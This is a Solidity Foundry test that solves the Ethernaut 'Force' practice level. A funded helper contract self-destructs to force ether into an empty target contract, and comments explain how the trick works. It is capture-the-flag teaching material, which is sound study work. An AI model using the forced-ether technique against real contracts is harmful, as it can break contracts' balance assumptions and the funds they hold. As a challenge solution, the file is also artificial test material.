// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/ForceFactory.sol";

contract Helper {
	uint public balance = 0;
	function deposit() public payable {
		balance += msg.value;
	}
	function destroy(address payable _to) public {
		selfdestruct(_to);
	}
}

contract ForceExploit is DSTest {
	Vm private vm = Vm(address(HEVM_ADDRESS));
	Ethernaut private ethernaut;
	address private eoaAddress = address(1337);

	function setUp() public {
		ethernaut = new Ethernaut();
		vm.deal(eoaAddress, 1 ether);
	}

	function testExploit() public {
		// Setting up the level
		ForceFactory factory = new ForceFactory();
		ethernaut.registerLevel(factory);
		vm.startPrank(eoaAddress);
		address levelAddress = ethernaut.createLevelInstance(factory);
		Force target = Force(payable(levelAddress));

		// TODO: Exploit the contract
		// The goal is to make the contract balance greater than zero. There's one problem however, the
		// smart contract Force is empty. We know that there are 3 ways to send ether to a contract:
		// - via payable functions (ie. fallback)
		// - from a destroyed contract using selfdestruct (designate a backup address to receive the
		// remaining ethers from the contract being destroyed) - that's what we'll use here
		// - via receiving mining rewards

		// 1. Deploy a contract and fund it
		Helper helper = new Helper();
		helper.deposit{value: 1 wei}();
		emit log_named_uint("Current Helper balance", address(helper).balance);

		// 2. Selfdestruct the contract and send the remaining ether to the Force contract
		emit log_named_uint("Current Force balance", address(target).balance);
		helper.destroy(payable(address(target)));
		emit log_named_uint("New Helper balance", address(helper).balance);
		emit log_named_uint("New Force balance", address(target).balance);

		// Submit the solution
		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}
}
